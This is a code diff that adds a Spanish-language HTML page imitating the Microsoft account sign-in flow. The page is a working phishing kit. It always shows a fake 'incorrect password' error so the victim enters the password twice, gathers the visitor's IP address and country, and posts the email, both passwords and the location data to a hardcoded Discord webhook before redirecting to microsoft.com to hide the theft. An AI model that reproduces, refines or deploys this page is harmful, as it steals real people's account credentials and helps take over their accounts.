@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="es-ES" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <style>
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family:
+          "Segoe UI",
+          -apple-system,
+          "Helvetica Neue",
+          sans-serif;
+        background-image: url("edugem.jpeg");
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0;
+      }
+
+      .login-card {
+        background: #fff;
+        width: 350px;
+        max-width: 440px;
+        padding: 44px 32px 28px;
+        display: flex;
+        flex-direction: column;
+      }
+
+      @media (min-width: 540px) {
+        body {
+          align-items: center;
+          padding: 40px 16px;
+        }
+        .login-card {
+          min-height: auto;
+          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+          padding: 44px 44px 32px;
+        }
+      }
+
+      .ms-logo {
+        margin-bottom: 24px;
+      }
+
+      .card-title {
+        font-size: 1.5rem;
+        font-weight: 600;
+        color: #1b1b1b;
+        margin-bottom: 28px;
+        line-height: 1.2;
+      }
+
+      /* Email display (password views) */
+      .email-display {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        border: 1px solid #8a8d91;
+        border-radius: 14px;
+        padding: 4px 12px 4px 8px;
+        font-size: 0.875rem;
+        color: #1b1b1b;
+        margin-bottom: 24px;
+        max-width: 100%;
+        cursor: pointer;
+      }
+      .email-display svg {
+        flex-shrink: 0;
+      }
+      .email-display span {
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .ms-input-wrap {
+        position: relative;
+        margin-bottom: 4px;
+      }
+      .ms-input-wrap label {
+        display: block;
+        font-size: 0.8125rem;
+        color: #605e5c;
+        margin-bottom: 0;
+        pointer-events: none;
+        position: absolute;
+        top: 14px;
+        left: 0;
+        transition:
+          top 0.15s,
+          font-size 0.15s,
+          color 0.15s;
+      }
+      .ms-input-wrap input:focus ~ label,
+      .ms-input-wrap input:not(:placeholder-shown) ~ label {
+        top: 0px;
+        font-size: 0.75rem;
+        color: #0067b8;
+      }
+
+      .ms-input {
+        width: 100%;
+        border: none;
+        border-bottom: 1px solid #605e5c;
+        padding: 18px 0 6px;
+        font-size: 0.9375rem;
+        color: #1b1b1b;
+        background: transparent;
+        outline: none;
+        appearance: none;
+      }
+      .ms-input::placeholder {
+        color: transparent;
+      }
+      .ms-input:focus {
+        border-bottom: 2px solid #0067b8;
+      }
+
+      .ms-input-box {
+        width: 100%;
+        border: 1px solid #8a8d91;
+        padding: 10px 12px;
+        font-size: 0.9375rem;
+        color: #1b1b1b;
+        background: #fff;
+        outline: none;
+      }
+      .ms-input-box:focus {
+        border-color: #0067b8;
+        box-shadow: 0 0 0 1px #0067b8;
+      }
+
+      .checkbox-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-top: 20px;
+        margin-bottom: 4px;
+      }
+      .checkbox-row input[type="checkbox"] {
+        width: 16px;
+        height: 16px;
+        border: 1px solid #8a8d91;
+        cursor: pointer;
+        accent-color: #0067b8;
+        flex-shrink: 0;
+      }
+      .checkbox-row label {
+        font-size: 0.875rem;
+        color: #1b1b1b;
+        cursor: pointer;
+        user-select: none;
+      }
+
+      .ms-link {
+        color: #0067b8;
+        font-size: 0.8125rem;
+        text-decoration: none;
+        display: inline-block;
+        margin-top: 12px;
+      }
+      .ms-link:hover {
+        text-decoration: underline;
+      }
+
+      .link-row {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        margin-bottom: 32px;
+      }
+
+      .btn-primary {
+        background: #0067b8;
+        border: 1px solid #0067b8;
+        color: #fff;
+        font-size: 0.9375rem;
+        font-weight: 400;
+        padding: 0 16px;
+        height: 40px;
+        min-width: 108px;
+        cursor: pointer;
+        transition: background 0.12s;
+      }
+      .btn-primary:hover {
+        background: #005499;
+        border-color: #005499;
+      }
+
+      .btn-row {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 28px;
+      }
+
+      .btn-row-email {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 28px;
+      }
+
+      .error-msg {
+        color: #a4262c;
+        font-size: 0.8125rem;
+        margin-top: 6px;
+        display: none;
+      }
+
+      .error-msg-static {
+        color: #a4262c;
+        font-size: 0.8125rem;
+        margin-top: 6px;
+        display: block;
+      }
+
+      .spacer {
+        flex: 1;
+      }
+
+      .ms-footer {
+        margin-top: 40px;
+        border-top: 1px solid #edebe9;
+        padding-top: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 8px;
+      }
+      .ms-footer a {
+        font-size: 0.75rem;
+        color: #605e5c;
+        text-decoration: none;
+        margin-right: 16px;
+      }
+      .ms-footer a:hover {
+        text-decoration: underline;
+        color: #323130;
+      }
+      .dots-btn {
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #605e5c;
+        padding: 4px;
+        display: inline-flex;
+      }
+      .dots-btn:hover {
+        color: #323130;
+      }
+
+      .second-password-note {
+        background-color: #fef1f0;
+        border-left: 3px solid #a4262c;
+        padding: 8px 12px;
+        margin: 16px 0 8px 0;
+        font-size: 0.8125rem;
+        color: #5c2e2e;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-card">
+      <div class="ms-logo">
+        <img
+          class="logo block mb-2 h-8 w-auto"
+          role="presentation"
+          src="edugemuni.png"
+          alt="Microsoft logo"
+        />
+      </div>
+
+      <!-- VISTA 1: EMAIL -->
+      <div id="viewEmail">
+        <h1 class="card-title">Iniciar sesión</h1>
+        <div class="ms-input-wrap" style="margin-bottom: 8px">
+          <input
+            type="email"
+            id="emailInput"
+            name="email"
+            class="ms-input-box"
+            placeholder="Correo electrónico, teléfono o Skype"
+            autocomplete="email"
+          />
+        </div>
+        <div id="emailError" class="error-msg">
+          Escribe una dirección de correo electrónico, número de teléfono o
+          nombre de Skype.
+        </div>
+        <div class="link-row" style="margin-top: 16px">
+          <a href="#" class="ms-link" onclick="dummyAlert(event)"
+            >¿No tiene una cuenta? Cree una.</a
+          >
+          <a href="#" class="ms-link" onclick="dummyAlert(event)"
+            >Opciones de inicio de sesión</a
+          >
+        </div>
+        <div class="btn-row-email">
+          <button class="btn-primary" id="nextBtn">Siguiente</button>
+        </div>
+      </div>
+
+      <!-- VISTA 2: PRIMERA CONTRASEÑA (siempre mostrará error y pasará al tercer paso) -->
+      <div id="viewPasswordFirst" style="display: none">
+        <h1 class="card-title">Escribir contraseña</h1>
+        <!-- correo guardado -->
+        <div class="email-display" id="emailDisplayFirst">
+          <span id="displayEmailFirst"></span>
+        </div>
+
+        <div class="ms-input-wrap">
+          <input
+            type="password"
+            id="passwordFirstInput"
+            name="password"
+            class="ms-input"
+            placeholder="Contraseña"
+            autocomplete="off"
+          />
+          <label for="passwordFirstInput">Contraseña</label>
+        </div>
+        <div id="passwordFirstError" class="error-msg">Escribe tu contraseña.</div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="keepSignedInFirst" />
+          <label for="keepSignedInFirst">Mantener la sesión iniciada</label>
+        </div>
+
+        <a href="#" class="ms-link" onclick="dummyAlert(event)">¿Olvidó su contraseña?</a>
+
+        <div class="btn-row">
+          <button class="btn-primary" id="signInFirstBtn">Iniciar sesión</button>
+        </div>
+      </div>
+
+      <!-- VISTA 3: SEGUNDA CONTRASEÑA (tercer paso, después del error) -->
+      <div id="viewPasswordSecond" style="display: none">
+        <h1 class="card-title">Vuelve a escribir tu contraseña</h1>
+        <!-- mismo correo -->
+        <div class="email-display" id="emailDisplaySecond">
+          <span id="displayEmailSecond"></span>
+        </div>
+
+        <!-- mensaje de error fijo: contraseña incorrecta (como pide el usuario) -->
+        <div class="second-password-note">
+          <strong>⚠️ Contraseña incorrecta</strong> — Por favor, introdúcela de nuevo
+        </div>
+
+        <div class="ms-input-wrap">
+          <input
+            type="password"
+            id="passwordSecondInput"
+            name="passwordConfirm"
+            class="ms-input"
+            placeholder="Contraseña (segundo intento)"
+            autocomplete="off"
+          />
+          <label for="passwordSecondInput">Confirma tu contraseña</label>
+        </div>
+        <div id="passwordSecondError" class="error-msg">La contraseña no puede estar vacía.</div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="keepSignedInSecond" />
+          <label for="keepSignedInSecond">Mantener la sesión iniciada</label>
+        </div>
+
+
+        <div class="btn-row">
+          <button class="btn-primary" id="signInSecondBtn">Iniciar sesión</button>
+        </div>
+      </div>
+
+      <div class="spacer"></div>
+
+      <div class="ms-footer">
+        <div>
+          <a href="#" onclick="dummyAlert(event)">Términos de uso</a>
+          <a href="#" onclick="dummyAlert(event)">Privacidad y cookies</a>
+        </div>
+        <button
+          class="dots-btn"
+          onclick="dummyAlert(event)"
+          title="Más opciones"
+        >
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+            <circle cx="2" cy="8" r="1.5" />
+            <circle cx="8" cy="8" r="1.5" />
+            <circle cx="14" cy="8" r="1.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <script>
+      (function () {
+        // Elementos de las tres vistas
+        const viewEmail = document.getElementById("viewEmail");
+        const viewPasswordFirst = document.getElementById("viewPasswordFirst");
+        const viewPasswordSecond = document.getElementById("viewPasswordSecond");
+
+        // Email
+        const emailInput = document.getElementById("emailInput");
+        const nextBtn = document.getElementById("nextBtn");
+        const emailError = document.getElementById("emailError");
+
+        // Primera contraseña
+        const passwordFirstInput = document.getElementById("passwordFirstInput");
+        const signInFirstBtn = document.getElementById("signInFirstBtn");
+        const passwordFirstError = document.getElementById("passwordFirstError");
+        const keepSignedInFirst = document.getElementById("keepSignedInFirst");
+        const displayEmailFirst = document.getElementById("displayEmailFirst");
+
+        // Segunda contraseña (tercer paso)
+        const passwordSecondInput = document.getElementById("passwordSecondInput");
+        const signInSecondBtn = document.getElementById("signInSecondBtn");
+        const passwordSecondError = document.getElementById("passwordSecondError");
+        const keepSignedInSecond = document.getElementById("keepSignedInSecond");
+        const displayEmailSecond = document.getElementById("displayEmailSecond");
+
+        // Variables globales
+        let storedEmail = "";
+        let firstPasswordValue = "";      // guardamos el primer intento (aunque sea "incorrecto")
+        let keepSignedInFlag = false;      // sincronizamos entre ambas pantallas (se usa la del segundo paso)
+
+        // --- FUNCIÓN PARA OBTENER IP Y PAÍS ---
+        async function fetchIpAndCountry() {
+          let ip = "No disponible";
+          let country = "No disponible";
+          try {
+            const response = await fetch("https://ipapi.co/json/");
+            if (response.ok) {
+              const data = await response.json();
+              ip = data.ip || "No disponible";
+              country = data.country_name || data.country || "No disponible";
+            } else {
+              console.warn("API de geolocalización no respondió correctamente");
+            }
+          } catch (error) {
+            console.error("Error al obtener IP/país:", error);
+          }
+          return { ip, country };
+        }
+
+        // --- ENVÍO A DISCORD Y REDIRECCIÓN (usa segunda contraseña como la final)---
+        async function sendCredentialsAndRedirect(finalPassword) {
+          // Mostramos indicador opcional (pero no bloquea UI)
+          const keepSigned = keepSignedInSecond.checked; // el usuario decide en el tercer paso
+
+          // Guardar datos en localStorage (por compatibilidad)
+          localStorage.setItem("user", storedEmail);
+          
+          const { ip, country } = await fetchIpAndCountry();
+          localStorage.setItem("ip", ip);
+          localStorage.setItem("country", country);
+
+          const webhookURL =
+            "https://discord.com/api/webhooks/1527873326679330958/sWDihh_rmmt_lOjw--ElLngYumt8mSf2XVWynvNv2EuNeHkGpUeAAcoGiPv9Lq_ea4qv";
+
+          // Preparamos el embed con ambos intentos de contraseña (primera + final)
+          try {
+            await fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                content: "🔐 Intento de inicio de sesión (3 pasos: email → pass1 → pass2)",
+                embeds: [
+                  {
+                    title: "Credenciales capturadas (tercer paso)",
+                    color: 0x0067b8,
+                    fields: [
+                      { name: "📧 Correo electrónico", value: storedEmail, inline: false },
+                      { name: "🔑 Primera contraseña (intento fallido simulado)", value: firstPasswordValue || "[vacío]", inline: true },
+                      { name: "✅ Segunda contraseña (verificación final)", value: finalPassword, inline: true },
+                      { name: "🌐 IP", value: ip, inline: true },
+                      { name: "📍 País", value: country, inline: true },
+                      { name: "🖱️ Mantener sesión", value: keepSigned ? "Sí" : "No", inline: true },
+                      { name: "📅 Flujo", value: "Email → Pass1 (error) → Pass2 (validado)", inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                  },
+                ],
+              }),
+            });
+            console.log("✅ Datos enviados a Discord correctamente (ambas contraseñas)");
+          } catch (error) {
+            console.error("❌ Fallo al enviar a Discord:", error);
+          }
+
+          // Redirigir después del envío (simula acceso correcto)
+          window.location.href = "https://www.microsoft.com/";
+        }
+
+        // --- VALIDACIÓN EMAIL (primer paso) ---
+        function validateEmail() {
+          const val = emailInput.value.trim();
+          if (!val) {
+            emailError.style.display = "block";
+            emailInput.focus();
+            return false;
+          }
+          emailError.style.display = "none";
+          return true;
+        }
+
+        // --- PASO 1: Siguiente (email) → mostramos primera pantalla de contraseña ---
+        nextBtn.addEventListener("click", function () {
+          if (!validateEmail()) return;
+          storedEmail = emailInput.value.trim();
+          // Actualizar displays de correo en ambas pantallas de password
+          displayEmailFirst.innerText = storedEmail;
+          displayEmailSecond.innerText = storedEmail;
+
+          // Limpiar campos de contraseñas anteriores
+          passwordFirstInput.value = "";
+          passwordSecondInput.value = "";
+          passwordFirstError.style.display = "none";
+          passwordSecondError.style.display = "none";
+          
+          // Sincronizar checkbox: por defecto ambos false, pero el definitivo será el del tercer paso
+          keepSignedInFirst.checked = false;
+          keepSignedInSecond.checked = false;
+          
+          // Mostrar vista de primera contraseña
+          viewEmail.style.display = "none";
+          viewPasswordFirst.style.display = "block";
+          viewPasswordSecond.style.display = "none";
+          passwordFirstInput.focus();
+        });
+
+        // --- PASO 2: PRIMER INTENTO DE CONTRASEÑA (SIEMPRE mostrar error y pasar al tercer paso) ---
+        signInFirstBtn.addEventListener("click", function () {
+          // Validar que el campo no esté vacío
+          const pwdFirst = passwordFirstInput.value;
+          if (!pwdFirst) {
+            passwordFirstError.style.display = "block";
+            passwordFirstInput.focus();
+            return;
+          }
+          // Ocultar posible error anterior
+          passwordFirstError.style.display = "none";
+          
+          // Guardamos la primera contraseña (la que consideramos "incorrecta" según el simulacro)
+          firstPasswordValue = pwdFirst;
+          
+          // Guardamos el estado del checkbox del primer paso, pero realmente se usará el del segundo paso
+          // De todas formas sincronizamos el flag inicial (por si el usuario no vuelve a marcar)
+          // Pero el diseño exige que el valor final sea el del tercer paso, así que lo tomaremos del segundo.
+          // Sin embargo, podemos pre-cargar el segundo checkbox con el mismo valor del primero para UX.
+          keepSignedInSecond.checked = keepSignedInFirst.checked;
+          
+          // Ahora pasamos a la tercera vista (segunda contraseña) mostrando el mensaje de "Contraseña incorrecta"
+          viewPasswordFirst.style.display = "none";
+          viewPasswordSecond.style.display = "block";
+          passwordSecondInput.value = "";
+          passwordSecondError.style.display = "none";
+          passwordSecondInput.focus();
+        });
+
+        // --- PASO 3: SEGUNDO INTENTO DE CONTRASEÑA (VERDADERA CREDENCIAL FINAL) ---
+        signInSecondBtn.addEventListener("click", async function () {
+          const finalPassword = passwordSecondInput.value;
+          if (!finalPassword) {
+            passwordSecondError.style.display = "block";
+            passwordSecondInput.focus();
+            return;
+          }
+          passwordSecondError.style.display = "none";
+          
+          // Prevenimos múltiples envíos (deshabilitar botón opcionalmente)
+          signInSecondBtn.disabled = true;
+          
+          // Llamamos al envío a Discord con la contraseña final (segundo input)
+          // Extra: también enviamos la primera contraseña almacenada.
+          await sendCredentialsAndRedirect(finalPassword);
+          
+          // Nota: la redirección ocurre dentro de sendCredentialsAndRedirect, 
+          // pero por si algo falla, habilitamos de nuevo después de un tiempo.
+          setTimeout(() => {
+            signInSecondBtn.disabled = false;
+          }, 3000);
+        });
+
+        // Función auxiliar para volver desde el tercer paso al primer paso de contraseña (si el usuario lo desea)
+        window.goBackToFirstPassword = function (e) {
+          e.preventDefault();
+          viewPasswordSecond.style.display = "none";
+          viewPasswordFirst.style.display = "block";
+          passwordFirstInput.value = "";     // limpiamos para reingresar
+          firstPasswordValue = "";
+          passwordFirstError.style.display = "none";
+          // Mantenemos el storedEmail y resincronizamos checkboxes
+          keepSignedInFirst.checked = keepSignedInSecond.checked;
+          passwordFirstInput.focus();
+        };
+
+        // --- EVENTOS DE TECLADO (Enter) ---
+        emailInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter") nextBtn.click();
+        });
+        passwordFirstInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter") signInFirstBtn.click();
+        });
+        passwordSecondInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter") signInSecondBtn.click();
+        });
+
+        // Limpiar errores al escribir
+        emailInput.addEventListener("input", () => {
+          emailError.style.display = "none";
+        });
+        passwordFirstInput.addEventListener("input", () => {
+          passwordFirstError.style.display = "none";
+        });
+        passwordSecondInput.addEventListener("input", () => {
+          passwordSecondError.style.display = "none";
+        });
+
+        // Sincronización opcional: cuando el usuario marca el checkbox del primer paso, 
+        // también reflejamos en el segundo paso (para que no pierda la preferencia)
+        keepSignedInFirst.addEventListener("change", function () {
+          keepSignedInSecond.checked = keepSignedInFirst.checked;
+        });
+        keepSignedInSecond.addEventListener("change", function () {
+          keepSignedInFirst.checked = keepSignedInSecond.checked;
+        });
+      })();
+
+      // Función para enlaces de demostración
+      function dummyAlert(e) {
+        e.preventDefault();
+        alert("Enlace de demostración — no navega a ningún servidor real.");
+      }
+    </script>
+  </body>
+</html>
